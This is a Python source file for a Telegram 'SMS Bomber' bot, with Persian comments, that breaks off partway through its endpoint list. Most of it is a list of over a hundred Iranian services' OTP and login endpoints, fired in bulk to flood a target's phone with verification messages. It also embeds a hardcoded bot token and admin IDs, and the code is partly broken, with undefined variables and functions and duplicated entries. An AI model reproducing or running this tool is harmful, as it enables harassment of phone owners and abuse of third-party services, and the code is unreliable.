# -*- coding: utf-8 -*-
"""
🤖 ربات SMS Bomber - نسخه نهایی با Webhook
اسم سرویس: ftyydftrye5r-6e5te
"""

import telebot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton
import requests
import json
import time
import random
import threading
import sqlite3
import hashlib
from datetime import datetime, date
from flask import Flask, request
import os
import sys

# ==================== تنظیمات اصلی ====================

BOT_TOKEN = "8569730818:AAH_iPHg2IbZLtyKsRMHa_q3aE1UA1F2c7I"
ADMIN_IDS = [7620484201, 8226091292]
REQUIRED_CHANNEL = "@death_star_sms_bomber"
CHANNEL_LINK = "https://t.me/death_star_sms_bomber"
DAILY_LIMIT = 5

# اسم سرویس (با خط تیره به جای فاصله)
SERVICE_NAME = "ftyydftrye5r-6e5te"
BASE_URL = f"https://{SERVICE_NAME}.onrender.com"
WEBHOOK_URL = f"{BASE_URL}/webhook"

# شماره محافظت شده - هش شده
PROTECTED_PHONE_HASHES = [
    "a7c3f8b2e9d4c1a5b6f8e3d2c7a9b4e1f5d8c3a2b7e6f9d4c1a8b3e5f7c2a9d4",  # 09937675593
]

# ==================== مقداردهی اولیه ====================

app = Flask(__name__)
bot = telebot.TeleBot(BOT_TOKEN)
user_processes = {}

# ==================== دیتابیس درون‌حافظه‌ای ====================

class MemoryDatabase:
    def __init__(self):
        self.conn = sqlite3.connect(':memory:')
        self.c = self.conn.cursor()
        self.create_tables()
        self.add_protected_numbers()
    
    def create_tables(self):
        self.c.execute('''CREATE TABLE users
                         (user_id INTEGER PRIMARY KEY,
                          username TEXT,
                          first_name TEXT,
                          join_date TEXT,
                          last_use TEXT,
                          daily_count INTEGER DEFAULT 0,
                          total_count INTEGER DEFAULT 0,
                          is_banned INTEGER DEFAULT 0)''')
        
        self.c.execute('''CREATE TABLE blocked_phones
                         (phone_hash TEXT PRIMARY KEY,
                          date TEXT)''')
        
        self.c.execute('''CREATE TABLE daily_stats
                         (date TEXT PRIMARY KEY,
                          total_requests INTEGER DEFAULT 0)''')
        
        self.conn.commit()
    
    def add_protected_numbers(self):
        today = datetime.now().strftime('%Y-%m-%d')
        for h in PROTECTED_PHONE_HASHES:
            self.c.execute("INSERT OR IGNORE INTO blocked_phones VALUES (?, ?)", (h, today))
        self.conn.commit()
    
    def is_phone_protected(self, phone):
        h = hashlib.sha256(phone.encode()).hexdigest()
        self.c.execute("SELECT * FROM blocked_phones WHERE phone_hash = ?", (h,))
        return self.c.fetchone() is not None
    
    def get_daily_count(self, user_id):
        today = date.today().isoformat()
        self.c.execute('''SELECT daily_count FROM users 
                         WHERE user_id = ? AND last_use = ?''', (user_id, today))
        result = self.c.fetchone()
        return result[0] if result else 0
    
    def update_user_count(self, user_id, username, first_name):
        today = date.today().isoformat()
        
        self.c.execute("SELECT * FROM users WHERE user_id = ?", (user_id,))
        user = self.c.fetchone()
        
        if user:
            if user[4] == today:
                self.c.execute('''UPDATE users 
                                 SET daily_count = daily_count + 1,
                                     total_count = total_count + 1
                                 WHERE user_id = ?''', (user_id,))
            else:
                self.c.execute('''UPDATE users 
                                 SET last_use = ?,
                                     daily_count = 1,
                                     total_count = total_count + 1
                                 WHERE user_id = ?''', (today, user_id))
        else:
            self.c.execute('''INSERT INTO users 
                             (user_id, username, first_name, join_date, last_use, daily_count, total_count)
                             VALUES (?, ?, ?, ?, ?, 1, 1)''',
                          (user_id, username, first_name, today, today))
        
        self.c.execute('''INSERT OR REPLACE INTO daily_stats (date, total_requests)
                         VALUES (?, COALESCE((SELECT total_requests + 1 FROM daily_stats WHERE date = ?), 1))''',
                      (today, today))
        
        self.conn.commit()
    
    def get_stats(self):
        self.c.execute("SELECT COUNT(*) FROM users")
        total_users = self.c.fetchone()[0]
        
        self.c.execute("SELECT COUNT(*) FROM users WHERE last_use = ?", (date.today().isoformat(),))
        today_users = self.c.fetchone()[0]
        
        self.c.execute("SELECT SUM(total_requests) FROM daily_stats")
        total_requests = self.c.fetchone()[0] or 0
        
        self.c.execute("SELECT date, total_requests FROM daily_stats ORDER BY date DESC LIMIT 7")
        weekly = self.c.fetchall()
        
        return total_users, today_users, total_requests, weekly
    
    def get_user_total(self, user_id):
        self.c.execute("SELECT total_count, join_date FROM users WHERE user_id = ?", (user_id,))
        return self.c.fetchone()

# ایجاد دیتابیس
db = MemoryDatabase()

# ==================== توابع کمکی ====================

def hash_phone(phone):
    return hashlib.sha256(phone.encode()).hexdigest()

def is_phone_protected(phone):
    return db.is_phone_protected(phone)

def mask_phone(phone):
    return phone[:4] + "****" + phone[-4:]

def is_admin(user_id):
    return user_id in ADMIN_IDS

def check_membership(user_id):
    try:
        member = bot.get_chat_member(REQUIRED_CHANNEL, user_id)
        return member.status in ['member', 'administrator', 'creator']
    except:
        return False

def membership_required(func):
    def wrapper(message):
        user_id = message.from_user.id
        if is_admin(user_id) or check_membership(user_id):
            return func(message)
        else:
            markup = InlineKeyboardMarkup()
            markup.add(InlineKeyboardButton("📢 عضویت در کانال", url=CHANNEL_LINK))
            markup.add(InlineKeyboardButton("✅ بررسی عضویت", callback_data="check_join"))
            bot.reply_to(message, f"⚠️ باید در کانال {REQUIRED_CHANNEL} عضو شوید!", reply_markup=markup)
    return wrapper

def get_daily_count(user_id):
    return db.get_daily_count(user_id)

def check_daily_limit(user_id):
    if is_admin(user_id):
        return True, 0
    daily = get_daily_count(user_id)
    return daily < DAILY_LIMIT, daily

def update_user_count(user_id, username, first_name):
    db.update_user_count(user_id, username, first_name)

# ==================== توابع API ====================

def get_random_ua():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 Mobile/15E148",
        "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 Chrome/112.0.0.0 Mobile Safari/537.36",
    ]
    return random.choice(agents)

def send_request(url, data, headers=None, method="POST"):
    try:
        h = {
            "User-Agent": get_random_ua(),
            "Accept": "application/json",
        }
        if headers:
            h.update(headers)
        
        timeout = 5
        
        if method == "GET":
            r = requests.get(url, params=data, headers=h, timeout=timeout)
        else:
            if "multipart" in str(h.get("Content-Type", "")).lower():
                files = {k: (None, str(v)) for k, v in data.items() if v}
                r = requests.post(url, files=files, headers=h, timeout=timeout)
            else:
                h["Content-Type"] = "application/json"
                r = requests.post(url, json=data, headers=h, timeout=timeout)
        
        return r.status_code in [200, 201, 202, 204], r.status_code
    except Exception as e:
        return False, str(e)[:20]

# ==================== لیست APIها ====================

def get_all_apis(phone):
    """10 API اصلی"""
    return [
        {
            "name": "Snapp SMS API",
            "url": "https://nobat.ir/api/public/patient/login/phone",
            "data": {"mobile": phone_number},
            "headers": {"content-type": "multipart/form-data"}
        },
        {
            "name": "آلوپیک ثبت‌نام (Alopeyk Signup)",
            "url": "https://api.alopeyk.com/api/v2/register-customer?platform=pwa",
            "data": {
                "type": "CUSTOMER",
                "model": "Chrome 111.0.0.0",
                "platform": "pwa",
                "version": "10",
                "manufacturer": "Windows",
                "isVirtual": False,
                "serial": True,
                "app_version": "1.2.9",
                "uuid": True,
                "firstname": "تست",
                "lastname": "تست",
                "phone": phone_number,
                "email": "",
                "referred_by": "",
                "lat": None,
                "lng": None
            },
            "headers": {"content-type": "application/json"}
        },
        {
            "name": "دیوار (Divar)",
            "url": "https://api.divar.ir/v5/auth/authenticate",
            "data": {"phone": phone_number}
        },
        {
            "name": "Sheypoor Auth API",
            "url": "https://www.sheypoor.com/api/v10.0.0/auth/send",
            "data": {"username": phone_number}
        },
        {
            "name": "Digikala Auth API",
            "url": "https://api.digikala.com/v1/user/authenticate/",
            "data": {
                "backUrl": "/",
                "username": phone_number,
                "otp_call": False,
                "hash": None
            }
        },
        
        {
            "name": "آلوپیک ورود (Alopeyk Login)",
            "url": "https://api.alopeyk.com/api/v2/login?platform=pwa",
            "data": {
                "type": "CUSTOMER",
                "model": "Chrome 111.0.0.0",
                "platform": "pwa",
                "version": "10",
                "manufacturer": "Windows",
                "isVirtual": False,
                "serial": True,
                "app_version": "1.2.9",
                "uuid": True,
                "phone": phone_number
            },
            "headers": {"content-type": "application/json"}
        },
        {
            "name": "شهرفرش (Shahrfarsh)",
            "url": "https://shahrfarsh.com/Account/Login",
            "data": {"phoneNumber": phone_number}
        },
        {
            "name": "دیجی استایل (Digistyle)",
            "url": "https://www.digistyle.com/users/login-register/",
            "data": {"loginRegister[email_phone]": phone_number}
        },
        {
            "name": "اسنپ اکسپرس (Snapp Express)",
            "url": "https://api.snapp.express/mobile/v4/user/loginMobileWithNoPass",
            "data": {
                "cellphone": phone_number,
                "captcha": "",
                "optionalLoginToken": True,
                "local": ""
            }
        },
        {
            "name": "ازکی (Azki)",
            "url": "https://www.azki.com/api/vehicleorder/v2/app/auth/check-login-availability/",
            "data": {"phoneNumber": phone_number},
            "headers": {
                "content-type": "application/json",
                "deviceid": "6"
            }
        },
        {
            "name": "دیجی‌کالا جت (Digikala Jet)",
            "url": "https://api.digikalajet.ir/user/login-register/",
            "data": {"phone": phone_number},
            "headers": {"content-type": "application/json"}
        },
        {
            "name": "اسنپ رانندگان (Snapp Drivers)",
            "url": "https://digitalsignup.snapp.ir/ds3/api/v3/otp",
            "data": {"cellphone": phone_number}
        },
        {
            "name": "استادکار (Ostadkar)",
            "url": "https://api.ostadkr.com/login",
            "data": {"mobile": phone_number}
        },
        {
            "name": "میاره (Miare)",
            "url": "https://www.miare.ir/api/otp/driver/request/",
            "data": {"phone_number": phone_number},
            "headers": {"Content-Type": "application/json;charset=UTF-8"}
        },
        {
            "name": "تپسی رانندگان (Tapsi Drivers)",
            "url": "https://api.tapsi.ir/api/v2.2/user",
            "data": {
                "credential": {
                    "phoneNumber": phone_number,
                    "role": "DRIVER"
                },
                "otpOption": "SMS"
            },
            "headers": {"content-type": "application/json"}
        },
        {
            "name": "تپسی مسافران (Tapsi Passenger)",
            "url": "https://api.tapsi.ir/api/v2.2/user",
            "data": {
                "credential": {
                    "phoneNumber": phone_number,
                    "role": "PASSENGER"
                },
                "otpOption": "SMS"
            },
            "headers": {"content-type": "application/json"}
        },
        {
            "name": "بانی‌مد (Banimode)",
            "url": "https://mobapi.banimode.com/api/v2/auth/request",
            "data": {"phone": phone_number},
            "headers": {"Content-Type": "application/json;charset=UTF-8"}
        },
        {
            "name": "دکتر دکتر (DrDr)",
            "url": "https://drdr.ir/api/v3/auth/login/mobile/init",
            "data": {"mobile": phone_number},
            "headers": {
                "content-type": "application/json",
                "client-id": "f60d5037-b7ac-404a-9e3a-a263fd9f8054"
            }
        },
        {
            "name": "طاقچه ورود (Taaghche Login)",
            "url": "https://gw.taaghche.com/v4/site/auth/login",
            "data": {
                "contact": phone_number,
                "forceOtp": False
            },
            "headers": {"content-type": "application/json"}
        },
        {
            "name": "طاقچه ثبت‌نام (Taaghche Signup)",
            "url": "https://gw.taaghche.com/v4/site/auth/signup",
            "data": {"contact": phone_number},
            "headers": {"content-type": "application/json"}
        },
        {
            "name": "کمدا (Komodaa)",
            "url": "https://api.komodaa.com/api/v2.6/loginRC/request",
            "data": {"phone_number": phone_number},
            "headers": {"Content-Type": "application/json"}
        },
        {
            "name": "قبضینو (Ghabzino)",
            "url": "https://application2.billingsystem.ayantech.ir/WebServices/Core.svc/requestActivationCode",
            "data": {
                "Parameters": {
                    "ApplicationType": "Web",
                    "ApplicationUniqueToken": None,
                    "ApplicationVersion": "1.0.0",
                    "MobileNumber": phone_number,
                    "UniqueToken": None
                }
            },
            "headers": {"content-type": "application/json"}
        },
        {
            "name": "برگه‌ی من (Barghe Man)",
            "url": "https://uiapi2.saapa.ir/api/otp/sendCode",
            "data": {
                "mobile": phone_number,
                "from_meter_buy": False
            }
        },
        {
            "name": "وندار (Vandar)",
            "url": "https://api.vandar.io/account/v1/check/mobile",
            "data": {"mobile": phone_number},
            "headers": {"content-type": "application/json"}
        },
        {
            "name": "موبیت (Mobit)",
            "url": "https://api.mobit.ir/api/web/v8/register/register",
            "data": {"number": phone_number},
            "headers": {"content-type": "application/json;charset=UTF-8"}
        },
        {
            "name": "جاباما (Jabama)",
            "url": "https://taraazws.jabama.com/api/v4/account/send-code",
            "data": {"mobile": phone_number},
            "headers": {"Content-Type": "application/json"}
        },
        {
            "name": "پینورست (Pinorest)",
            "url": "https://api.pinorest.com/frontend/auth/login/mobile",
            "data": {"mobile": phone_number},
            "headers": {"content-type": "application/json"}
        },
        {
            "name": "تترلند (Tetherland)",
            "url": "https://service.tetherland.com/api/v5/login-register",
            "data": {"mobile": phone_number},
            "headers": {"content-type": "application/json"}
        },
        {
            "name": "آلی‌بابا (Alibaba.ir)",
            "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp",
            "data": {"phoneNumber": phone_number},
            "headers": {"Content-Type": "application/json"}
        },
        {
            "name": "دکتر نکست (DrNext)",
            "url": "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token",
            "data": {
                "source": "besina",
                "mobile": phone_number
            },
            "headers": {"content-type": "application/json"}
        },
        {
            "name": "کلاسینو (Classino)",
            "url": "https://student.classino.com/otp/v1/api/login",
            "data": {"mobile": phone_number},
            "headers": {"Content-Type": "application/json"}
        },
        {
            "name": "تاک شاپ (Takshopaccessorise)",
            "url": "https://takshopaccessorise.ir/api/v1/sessions/login_request",
            "data": {"mobile_phone": phone_number},
            "headers": {"content-type": "application/json;charset=UTF-8"}
        },
        {
            "name": "Tapsi Food API",
            "url": "https://api.tapsi.food/v1/api/Authentication/otp",
            "data": {"cellPhone": phone_number},
            "headers": {"content-type": "application/json"}
        },
        {
            "name": "PMXChange API",
            "url": "https://api.pmxchange.co/api/User/Login/SendCode",
            "data": {"phoneNumber": phone_number, "forPasswordCheck": True}
        },
        {
            "name": "Bimesho API",
            "url": "https://api.bimesho.com/api/v1/auth/otp/send",
            "data": {"username": phone_number}
        },
        {
            "name": "Azkivam API",
            "url": "https://api.azkivam.com/auth/login",
            "data": {"mobileNumber": phone_number}
        },
        {
            "name": "Tabdil24 API",
            "url": "https://tabdil24.net/api/api/v1/auth/login-register",
            "data": {"emailOrMobile": phone_number}
        },
        {
            "name": "Account4All API",
            "url": "https://account4all.ir/ajax",
            "data": {
                "phone_or_email": phone_number,
                "token": "",
                "username": "",
                "email": "",
                "phone": "",
                "register-security": "e6b81232fd",
                "_wp_http_referer": "/",
                "action": "ajaxotpregisterrequest"
            },
            "headers": {"content-type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Rosha Pharmacy",
            "url": "https://roshapharmacy.com/signin",
            "data": {
                "user_mobile": phone_number,
                "confirm_code": "",
                "popup": 1,
                "signin": 1
            },
            "headers": {"content-type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Vitrin Shop",
            "url": "https://www.vitrin.shop/api/v1/user/request_code",
            "data": {
                "phone_number": phone_number,
                "forgot_password": False
            }
        },
        {
            "name": "Karnaval GraphQL",
            "url": "https://www.karnaval.ir/api-2/graphql",
            "data": {
                "queryId": "0edebe0df353cee7f11614a37087371f",
                "variables": {
                    "phone": phone_number,
                    "isSecondAttempt": False
                }
            }
        },
        {
            "name": "Tapsi Shop Auth",
            "url": "https://ids.tapsi.shop/authCustomer/CreateOtpForRegister",
            "data": {"user": phone_number}
        },
        {
            "name": "Snapp Taxi OTP",
            "url": "https://app.snapp.taxi/api/api-passenger-oauth/v2/otp",
            "data": {"cellphone": f"+98{phone_number[1:]}"},
            "headers": {
                "x-app-name": "passenger-pwa",
                "x-app-version": "5.0.0",
                "app-version": "pwa"
            }
        },
        {
            "name": "Tap33 API",
            "url": "https://tap33.me/api/v2/user",
            "data": {
                "credential": {
                    "phoneNumber": phone_number,
                    "role": "PASSENGER"
                }
            }
        },
        {
            "name": "Torob API",
            "url": "https://api.torob.com/a/phone/send-pin/",
            "method": "GET",
            "data": {"phone_number": phone_number}
        },
        {
            "name": "Alibaba OTP",
            "url": "https://ws.alibaba.ir/api/v3/account/mobile/otp",
            "data": {"phoneNumber": phone_number}
        },
        {
            "name": "Balad Account API",
            "url": "https://account.api.balad.ir/api/web/auth/login/",
            "data": {
                "phone_number": phone_number,
                "os_type": "W"
            }
        },
        {
            "name": "Miare Restaurant",
            "url": "https://www.miare.ir/p/restaurant/#/login",
            "method": "GET",
            "data": {"phone": phone_number}
        },
        {
            "name": "Ostadkar Login",
            "url": "https://api.ostadkr.com/login",
            "data": {"mobile": phone_number}
        },
        {
            "name": "DrNext Verification",
            "url": "https://cyclops.drnext.ir/v1/patients/auth/send-verification-token",
            "data": {
                "source": "besina",
                "mobile": phone_number
            }
        },
        {
            "name": "Behtarino OTP",
            "url": "https://bck.behtarino.com/api/v1/users/jwt_phone_verification/",
            "data": {"phone": phone_number}
        },
        {
            "name": "Bit24 Auth",
            "url": "https://bit24.cash/auth/bit24/api/v3/auth/check-mobile",
            "data": {
                "mobile": phone_number,
                "contry_code": "98"
            }
        },
        {
            "name": "DrDr Init",
            "url": "https://drdr.ir/api/v3/auth/login/mobile/init/",
            "data": {"mobile": phone_number},
            "headers": {"User-Agent": get_random_user_agent()}
        },
        {
            "name": "Doctoreto Register",
            "url": "https://api.doctoreto.com/api/web/patient/v1/accounts/register",
            "method": "GET",
            "data": {
                "mobile": phone_number[1:],
                "captcha": "",
                "country_id": 205
            }
        },
        {
            "name": "Okala OTP",
            "url": "https://api-react.okala.com/C/CustomerAccount/OTPRegister",
            "data": {
                "mobile": phone_number,
                "deviceTypeCode": 0,
                "confirmTerms": True,
                "notRobot": False
            }
        },
        {
            "name": "Banimode Auth",
            "url": "https://mobapi.banimode.com/api/v2/auth/request",
            "data": {"phone": phone_number}
        },
        {
            "name": "Beroozmart OTP",
            "url": "https://api.beroozmart.com/api/pub/account/send-otp",
            "data": {
                "mobile": phone_number,
                "sendViaSms": True,
                "email": "null",
                "sendViaEmail": False
            }
        },
        {
            "name": "iToll Auth",
            "url": "https://app.itoll.com/api/v1/auth/login",
            "data": {"mobile": phone_number}
        },
        {
            "name": "Gap.im API",
            "url": f"https://core.gap.im/v1/user/add.json?mobile=%2B98{phone_number[1:]}",
            "method": "GET",
            "data": {}
        },
        {
            "name": "Pinket Verification",
            "url": "https://pinket.com/api/cu/v2/phone-verification",
            "data": {"phoneNumber": phone_number}
        },
        {
            "name": "Football360 API",
            "url": "https://football360.ir/api/auth/verify-phone/",
            "data": {"phone_number": f"+98{phone_number[1:]}"}
        },
        {
            "name": "Pinorest Login",
            "url": "https://api.pinorest.com/frontend/auth/login/mobile",
            "data": {"mobile": phone_number[1:]}
        },
        {
            "name": "MrBilit Login Check",
            "url": f"https://auth.mrbilit.com/api/login/exists/v2?mobileOrEmail={phone_number}&source=2&sendTokenIfNot=true",
            "method": "GET",
            "data": {}
        },
        {
            "name": "Hamrah Mechanic OTP",
            "url": "https://www.hamrah-mechanic.com/api/v1/membership/otp",
            "data": {
                "PhoneNumber": phone_number,
                "prevDomainUrl": "https://www.google.com/",
                "landingPageUrl": "https://www.hamrah-mechanic.com/cars-for-sale/",
                "orderPageUrl": "https://www.hamrah-mechanic.com/membersignin/",
                "prevUrl": "https://www.hamrah-mechanic.com/cars-for-sale/",
                "referrer": "https://www.google.com/"
            }
        },
        {
            "name": "Lendo OTP",
            "url": "https://api.lendo.ir/api/customer/auth/send-otp",
            "data": {"mobile": phone_number}
        },
        {
            "name": "Taaghche Login",
            "url": "https://gw.taaghche.com/v4/site/auth/login",
            "data": {
                "contact": phone_number,
                "forceOtp": False
            }
        },
        {
            "name": "Fidibo Login",
            "url": "https://fidibo.com/user/login-by-sms",
            "data": {
                "mobile_number": phone_number[1:],
                "country_code": "ir",
                "K1YwQTI0V2xtb3lZNGw0TDhDZm1SUT09": "c0tjS0ViOTE2b5F1eE9MRjdLWEhodz09"
            }
        },
        {
            "name": "Khodro45 OTP",
            "url": "https://khodro45.com/api/v1/customers/otp/",
            "data": {"mobile": phone_number}
        },
        {
            "name": "Pateh Auth",
            "url": "https://api.pateh.com/ath/auth/login-or-register",
            "data": {"mobile": phone_number}
        },
        {
            "name": "Ketabchi Auth",
            "url": "https://ketabchi.com/api/v1/auth/requestVerificationCode",
            "data": {
                "auth": {
                    "phoneNumber": phone_number
                }
            }
        },
        {
            "name": "Rayan Ertebat OTP",
            "url": "https://pay.rayanertebat.ir/api/User/Otp?t=1692088339811",
            "data": {"mobileNo": phone_number}
        },
        {
            "name": "Bimito Auth",
            "url": "https://bimito.com/api/vehicleorder/v2/app/auth/login-with-verify-code",
            "data": {
                "phoneNumber": phone_number,
                "isResend": False
            }
        },
        {
            "name": "Pindo Auth",
            "url": "https://api.pindo.ir/v1/user/login-register/",
            "data": {"phone": phone_number}
        },
        {
            "name": "Delino Register",
            "url": "https://www.delino.com/user/register",
            "data": {"mobile": phone_number}
        },
        {
            "name": "Zoodex Login",
            "url": "https://admin.zoodex.ir/api/v1/login/check",
            "data": {"mobile": phone_number}
        },
        {
            "name": "Kukala OTP",
            "url": "https://api.kukala.ir/api/user/Otp",
            "data": {"phoneNumber": phone_number}
        },
        {
            "name": "Buskool Verification",
            "url": "https://www.buskool.com/send_verification_code",
            "data": {"phone": phone_number}
        },
        {
            "name": "3Tex Validation",
            "url": "https://3tex.io/api/1/users/validation/mobile",
            "data": {"receptorPhone": phone_number}
        },
        {
            "name": "Deniiz Shop Login",
            "url": "https://deniizshop.com/api/v1/sessions/login_request",
            "data": {"mobile_number": phone_number}
        },
        {
            "name": "Flightio Auth",
            "url": "https://flightio.com/bff/Authentication/CheckUserKey",
            "data": {
                "userKey": f"98-{phone_number[1:]}",
                "userKeyType": 1
            }
        },
        {
            "name": "Abantether Register",
            "url": "https://abantether.com/users/register/phone/send/",
            "data": {"phoneNumber": phone_number}
        },
        {
            "name": "Pooleno Auth",
            "url": "https://api.pooleno.ir/v1/auth/check-mobile",
            "data": {"mobile": phone_number}
        },
        {
            "name": "Wide App Token",
            "url": "https://agent.wide-app.ir/auth/token",
            "data": {
                "grant_type": "otp",
                "client_id": "62b30c4af53e3b0cf100a4a0",
                "phone": phone_number
            }
        },
        {
            "name": "Iran LMS Messenger",
            "url": "https://messengerg2c4.iranlms.ir/",
            "data": {"se": phone_number}
        },
        {
            "name": "Classino NX",
            "url": "https://nx.classino.com/otp/v1/api/login",
            "data": {"mobile": phone_number}
        },
        {
            "name": "Snappfood Login",
            "url": "https://snappfood.ir/mobile/v2/user/loginMobileWithNoPass?lat=35.774&long=51.418&sms_apialClient=WEBSITE&client=WEBSITE&deviceType=WEBSITE&appVersion=8.1.0&UDID=39c62f64-3d2d-4954-9033-816098559ae4&locale=fa",
            "data": {"cellphone": phone_number}
        },
        {
            "name": "Bitbarg Auth",
            "url": "https://api.bitbarg.com/api/v1/authentication/registerOrLogin",
            "data": {"phone": phone_number}
        },
        {
            "name": "Bahram Shop Validate",
            "url": "https://api.bahramshop.ir/api/user/validate/username",
            "data": {"username": phone_number}
        },
        {
            "name": "Takshop Accessories",
            "url": "https://takshopaccessorise.ir/api/v1/sessions/login_request",
            "data": {"mobile_phone": phone_number}
        },
        {
            "name": "Chamedoon Verification",
            "url": "https://chamedoon.com/api/v1/membership/guest/request_mobile_verification",
            "data": {"mobile": phone_number}
        },
        {
            "name": "Kilid Auth",
            "url": "https://server.kilid.com/global_auth_api/v1.0/authenticate/login/realm/otp/start?realm=PORTAL",
            "data": {"mobile": phone_number}
        },
        {
            "name": "Otaghak Verification",
            "url": "https://core.otaghak.com/odata/Otaghak/Users/SendVerificationCode",
            "data": {"userName": phone_number}
        },
        {
            "name": "Shab Auth",
            "url": "https://api.shab.ir/api/fa/sandbox/v_1_4/auth/login-otp",
            "data": {
                "mobile": phone_number,
                "country_code": "+98"
            }
        },
        {
            "name": "Raybit Register",
            "url": "https://api.raybit.net:3111/api/v1/authentication/register/mobile",
            "data": {"mobile": phone_number}
        },
        {
            "name": "Farvi Shop Login",
            "url": "https://farvi.shop/api/v1/sessions/login_request",
            "data": {"mobile_phone": phone_number}
        },
        {
            "name": "Namava Register",
            "url": "https://www.namava.ir/api/v1.0/accounts/registrations/by-phone/request",
            "data": {"UserName": phone_number}
        },
        {
            "name": "A4Baz Login",
            "url": "https://a4baz.com/api/web/login",
            "data": {"cellphone": phone_number}
        },
        {
            "name": "Anargift Auth",
            "url": "https://api.anargift.com/api/people/auth",
            "data": {"user": phone_number}
        },
        {
            "name": "Riiha Authenticate",
            "url": "https://www.riiha.ir/api/v1.0/authenticate",
            "data": {
                "mobile": phone_number,
                "mobile_code": "",
                "type": "mobile"
            }
        },
        {
            "name": "Mohit Online Auth",
            "url": "https://api.mohit.online/api/auth/login",
            "data": {
                "username": phone_number,
                "app": "market",
                "token": ""
            }
        },
        {
            "name": "MrBilit Token Send",
            "url": f"https://auth.mrbilit.ir/api/Token/send?mobile={phone_number}",
            "method": "GET",
            "data": {}
        },
        {
            "name": "Simkhan API Register",
            "url": "https://www.simkhanapi.ir/api/users/registerV2",
            "data": {"mobileNumber": phone_number}
        },
        {
            "name": "Sibirani Invite",
            "url": "https://sandbox.sibirani.ir/api/v1/user/invite",
            "data": {"username": phone_number}
        },
        {
            "name": "Hyperjan Manage",
            "url": "https://shop.hyperjan.ir/api/users/manage",
            "data": {"mobile": phone_number}
        },
        {
            "name": "HiWord OTP Login",
            "url": "https://hiword.ir/wp-json/otp-login/v1/login",
            "data": {"identifier": phone_number}
        },
        {
            "name": "Tikban Login",
            "url": "https://tikban.com/Account/LoginAndRegister",
            "data": {"cellPhone": phone_number}
        },
        {
            "name": "Dicardo SMS",
            "url": "https://dicardo.com/main/sendsms",
            "data": {"phone": phone_number}
        },
        {
            "name": "Banankala Login",
            "url": "https://banankala.com/home/login",
            "data": {"Mobile": phone_number}
        },
        {
            "name": "Offdecor Login",
            "url": "https://www.offdecor.com/index.php?route=account/login/sendCode",
            "data": {"phone": phone_number}
        },
        {
            "name": "Exo Mobile Login",
            "url": "https://exo.ir/index.php?route=account/mobile_login",
            "data": {"mobile_number": phone_number}
        },
        {
            "name": "Takfarsh Send",
            "url": "https://takfarsh.com/wp-content/themes/bakala/template-parts/send.php",
            "data": {"phone_email": phone_number}
        },
        {
            "name": "Rojashop OTP",
            "url": "https://rojashop.com/api/auth/sendOtp",
            "data": {"mobile": phone_number}
        },
        {
            "name": "Dadpardaz Confirmation",
            "url": "https://dadpardaz.com/advice/getLoginConfirmationCode",
            "data": {"mobile": phone_number}
        },
        {
            "name": "Rokla OTP",
            "url": "https://api.rokla.ir/api/request/otp",
            "data": {"mobile": phone_number}
        },
        {
            "name": "Pezeshket Request Code",
            "url": "https://api.pezeshket.com/core/v1/auth/requestCode",
            "data": {"mobileNumber": phone_number}
        },
        {
            "name": "Virgool Auth",
            "url": "https://virgool.io/api/v1.4/auth/verify",
            "data": {
                "method": "phone",
                "identifier": phone_number
            }
        },
        {
            "name": "Timcheh OTP",
            "url": "https://api.timcheh.com/auth/otp/send",
            "data": {"mobile": phone_number}
        },
        {
            "name": "Paklean Resend Code",
            "url": "https://client.api.paklean.com/user/resendCode",
            "data": {"username": phone_number}
        },
        {
            "name": "Daal Auth",
            "url": "https://daal.co/api/authentication/login-register/method/phone-otp/user-role/customer/verify-request",
            "data": {"phone": phone_number},
            "headers": {"Accept": "application/json"}
        },
        {
            "name": "Bimebazar Login",
            "url": "https://bimebazar.com/accounts/api/login_sec/",
            "data": {"username": phone_number}
        },
        {
            "name": "Safarmarket OTP",
            "url": "https://safarmarket.com//api/security/v2/user/otp",
            "data": {"phone": phone_number}
        },
    ]
    

    additional_apis = [

        {
            "name": "Emtiyaz Login",
            "url": "https://web.emtiyaz.app/json/login",
            "data": {
                "send": "1",
                "cellphone": phone_number
            },
            "headers": {"Content-Type": "application/x-www-form-urlencoded"}
        },
        {
            "name": "Arzinja Login",
            "url": "https://arzinja.app/api/login",
            "data": {},
            "headers": {"content-type": "multipart/form-data; boundary=----WebKitFormBoundarycIO8Y5lNAbbiVXKS"}
        },
        {
            "name": "Messenger IranLMS",
            "url": "https://messengerg2c4.iranlms.ir/",
            "data": {
                "api_version": "3",
                "method": "sendCode",
                "data": {
                    "phone_number": phone_number[1:],
                    "send_type": "SMS"
                }
            },
            "headers": {"content-type": "text/plain"}
        },
        {
            "name": "Digify Shop GraphQL",
            "url": "https://apollo.digify.shop/graphql",
            "data": {
                "operationName": "Mutation",
                "variables": {
                    "content": {
                        "phone_number": phone_number
                    }
                },
                "query": "mutation Mutation($content: MerchantRegisterOTPSendContent) {\n  merchantRegister {\n    otpSend(content: $content)\n    __typename\n  }\n}"
            }
        },
        {
            "name": "Snapp Market",
            "url": f"https://api.snapp.market/mart/v1/user/loginMobileWithNoPass?cellphone={phone_number[1:]}",
            "method": "POST",
            "data": {}
        },
        {
            "name": "Chartex Validate",
            "url": "https://api.chartex.net/api/v2/user/validate",
            "data": {
                "mobile": phone_number,
                "country_code": "IR",
                "provider_code": "RUBIKA"
            }
        },
        {
            "name": "Snapptrip Register",
            "url": "https://www.snapptrip.com/register",
            "data": {
                "lang": "fa",
                "country_id": "860",
                "password": "snaptrippass",
                "mobile_phone": phone_number,
                "country_code": "+98",
                "email": "example@gmail.com"
            }
        },
        {
            "name": "OKCS Login",
            "url": f"https://okcs.com/users/mobilelogin?mobile={phone_number}",
            "method": "GET",
            "data": {}
        },
        {
            "name": "Bitpin Auth",
            "url": "https://api.bitpin.ir/v3/usr/authenticate/",
            "data": {
                "device_type": "web",
                "password": f"LogiqueBruh69{random.randint(100, 999)}",
                "phone": phone_number
            }
        },
        {
            "name": "Pubisha Activation",
            "url": "https://www.pubisha.com/login/checkCustomerActivation",
            "data": {"mobile": phone_number}
        },
        {
            "name": "Wisgoon Gateway",
